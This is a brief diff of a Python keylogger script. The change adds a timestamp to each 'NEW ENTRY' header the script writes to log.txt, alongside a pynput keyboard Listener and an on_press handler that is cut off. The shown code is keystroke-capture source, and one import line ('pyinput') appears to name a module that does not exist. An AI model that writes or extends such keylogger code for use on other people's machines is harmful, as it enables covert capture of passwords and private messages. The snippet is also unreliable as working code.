@@ -1,11 +1,11 @@
 import pyinput
-import time
+from time import ctime
 from pynput.keyboard import Key, Listener
 
 keys = []
 
 with open("log.txt", "a") as file:
-    file.write("\n\nNEW ENTRY\n")
+    file.write("\n\nNEW ENTRY "+str(ctime())+"\n")
 
 def on_press(key):
     try:
